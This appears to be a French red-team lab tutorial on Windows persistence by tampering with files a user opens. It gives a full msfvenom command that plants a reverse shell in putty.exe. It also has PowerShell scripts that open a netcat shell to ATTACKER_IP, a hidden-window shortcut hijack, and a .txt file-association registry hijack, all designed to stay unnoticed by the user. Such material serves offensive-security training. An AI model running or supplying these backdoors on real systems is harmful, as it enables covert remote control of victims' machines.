Une autre méthode pour établir la persistance consiste à falsifier certains fichiers avec lesquels nous savons que l'utilisateur interagit régulièrement. En effectuant quelques modifications sur ces fichiers, nous pouvons installer des portes dérobées qui seront exécutées chaque fois que l'utilisateur y accédera. Puisque nous ne voulons pas créer d'alertes qui pourraient faire exploser notre couverture, les fichiers que nous modifions doivent continuer à fonctionner pour l'utilisateur comme prévu.

Bien qu'il existe de nombreuses possibilités d'implanter des portes dérobées, nous examinerons les plus couramment utilisées.

Fichiers exécutables

Si vous trouvez un exécutable sur le bureau, il y a de fortes chances que l'utilisateur l'utilise fréquemment. Supposons que nous trouvions un raccourci vers PuTTY qui traîne. Si nous vérifions les propriétés du raccourci, nous pourrions voir qu'il pointe (généralement) vers `C:\Program Files\PuTTY\putty.exe`. À partir de ce moment-là, nous pourrions télécharger l'exécutable sur la machine de notre attaquant et le modifier pour exécuter la charge utile de notre choix.

Vous pouvez facilement insérer une charge utile de votre choix dans n'importe quel fichier .exe avec `msfvenom`. Le binaire fonctionnera toujours comme d'habitude mais exécutera une charge utile supplémentaire en silence en ajoutant un thread supplémentaire dans votre binaire. Pour créer un putty.exe backdooré, nous pouvons utiliser la commande suivante :

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

Le puttyX.exe résultant exécutera une charge utile reverse_tcp Meterpreter sans que l'utilisateur ne s'en aperçoive. Bien que cette méthode soit suffisamment efficace pour établir la persistance, examinons d'autres techniques plus sournoises.

Fichiers de raccourci

Si nous ne voulons pas modifier l'exécutable, nous pouvons toujours modifier le fichier de raccourci lui-même. Au lieu de pointer directement vers l'exécutable attendu, nous pouvons le modifier pour pointer vers un script qui exécutera une porte dérobée puis exécutera normalement le programme habituel.

Pour cette tâche, vérifions le raccourci vers calc sur le bureau de l'administrateur. Si nous faisons un clic droit dessus et allons dans les propriétés, nous verrons où il pointe :

![7a7349b9dcc5af3180044ee1d7605967](https://github.com/dsgsec/Red-Team/assets/82456829/9f4d5cdc-a575-4fcb-8409-16fd5df9aee5)

Avant de détourner la cible du raccourci, créons un simple script Powershell dans `C:\Windows\System32`ou dans tout autre emplacement sournois. Le script exécutera un shell inversé, puis exécutera calc.exe à partir de l'emplacement d'origine dans les propriétés du raccourci :

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe

```

Enfin, nous modifierons le raccourci pour qu'il pointe vers notre script. Notez que l'icône du raccourci peut être automatiquement ajustée ce faisant. Assurez-vous de pointer l'icône vers l'exécutable d'origine afin qu'aucune modification visible n'apparaisse pour l'utilisateur. Nous souhaitons également exécuter notre script sur une fenêtre cachée, pour laquelle nous ajouterons l' `-windowstyle hidden`option à Powershell. La cible finale du raccourci serait :

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![fe703ddea6135e0c867afcc6f61a8cd2](https://github.com/dsgsec/Red-Team/assets/82456829/6819be8d-80e9-4c42-a7d6-5bea135c79d2)

Démarrons un écouteur nc pour recevoir notre reverse shell sur la machine de notre attaquant :

Boîte d'attaque

```
user@AttackBox$ nc -lvp 4445
```

Si vous double-cliquez sur le raccourci, vous devriez obtenir une connexion avec la machine de votre attaquant. Pendant ce temps, l'utilisateur recevra une calculatrice exactement comme il l'attend. Vous remarquerez probablement une invite de commande clignoter et disparaître immédiatement sur votre écran. J'espère que cela ne dérangera peut-être pas trop un utilisateur régulier. 


Détournement d'associations de fichiers

En plus de persister via des exécutables ou des raccourcis, nous pouvons détourner n'importe quelle association de fichiers pour forcer le système d'exploitation à exécuter un shell chaque fois que l'utilisateur ouvre un type de fichier spécifique.

Les associations de fichiers par défaut du système d'exploitation sont conservées dans le registre, où une clé est stockée pour chaque type de fichier sous `HKLM\Software\Classes\`. Disons que nous voulons vérifier quel programme est utilisé pour ouvrir les fichiers .txt ; nous pouvons simplement vérifier la `.txt`sous-clé et trouver quel ID de programmation (ProgID)  lui est associé. Un ProgID est simplement un identifiant pour un programme installé sur le système. Pour les fichiers .txt, nous aurons le ProgID suivant :

![3ae1b8356b38a349090e836026d6d480](https://github.com/dsgsec/Red-Team/assets/82456829/973c96e2-9c13-4ecf-88f0-a2593140b417)

Nous pouvons ensuite rechercher une sous-clé pour le ProgID correspondant (également sous `HKLM\Software\Classes\`), dans ce cas,  `txtfile`, où nous trouverons une référence au programme en charge de gérer les fichiers .txt. La plupart des entrées ProgID auront une sous-clé sous `shell\open\command`laquelle est spécifiée la commande par défaut à exécuter pour les fichiers avec cette extension :

![c3565cf93de4990f41f41b25aed80571](https://github.com/dsgsec/Red-Team/assets/82456829/9ac8861a-07cd-48b0-8e49-29731da4e4bd)

Dans ce cas, lorsque vous essayez d'ouvrir un fichier .txt, le système exécutera `%SystemRoot%\system32\NOTEPAD.EXE %1`, où `%1`représente le nom du fichier ouvert. Si nous voulons détourner cette extension, nous pourrions remplacer la commande par un script qui exécute une porte dérobée puis ouvre le fichier comme d'habitude. Tout d'abord, créons un script ps1 avec le contenu suivant et enregistrons-le sous`C:\Windows\backdoor2.ps1` :

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Remarquez comment dans Powershell, nous devons passer `$args[0]`au bloc-notes, car il contiendra le nom du fichier à ouvrir, tel qu'indiqué via `%1`.

Modifions maintenant la clé de registre pour exécuter notre script de porte dérobée dans une fenêtre cachée :

![f7ed25a701cf20ea85cf333b20708ffe](https://github.com/dsgsec/Red-Team/assets/82456829/9c485d7c-65af-44bc-bf08-77f3416a5c77)

Enfin, créez un écouteur pour votre shell inversé et essayez d'ouvrir n'importe quel fichier .txt sur la machine victime (créez-en un si nécessaire). Vous devriez recevoir un shell inversé avec les privilèges de l'utilisateur ouvrant le fichier.

